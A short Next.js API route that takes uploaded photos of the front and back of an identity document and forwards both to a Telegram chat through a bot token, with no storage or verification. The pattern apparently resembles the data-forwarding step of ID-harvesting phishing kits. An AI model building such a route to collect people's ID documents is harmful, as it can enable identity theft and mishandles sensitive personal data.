import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  try {
    const formData = await request.formData();
    const frontImage = formData.get('frontImage') as File;
    const backImage = formData.get('backImage') as File;

    if (!frontImage || !backImage) {
      return NextResponse.json(
        { error: 'Both front and back images are required' },
        { status: 400 }
      );
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      return NextResponse.json(
        { error: 'Telegram configuration missing' },
        { status: 500 }
      );
    }

    // Send front image
    const frontFormData = new FormData();
    frontFormData.append('chat_id', chatId);
    frontFormData.append('photo', frontImage);
    frontFormData.append('caption', 'Front of ID');

    // Send back image
    const backFormData = new FormData();
    backFormData.append('chat_id', chatId);
    backFormData.append('photo', backImage);
    backFormData.append('caption', 'Back of ID');

    // Send both images to Telegram
    const [frontResponse, backResponse] = await Promise.all([
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: frontFormData,
      }),
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: backFormData,
      }),
    ]);

    if (!frontResponse.ok || !backResponse.ok) {
      const frontError = await frontResponse.text();
      const backError = await backResponse.text();
      console.error('Telegram API errors:', frontError, backError);
      throw new Error('Failed to send images to Telegram');
    }

    return NextResponse.json({ 
      success: true, 
      message: 'Images sent successfully' 
    });
  } catch (error) {
    console.error('Error in Telegram API route:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}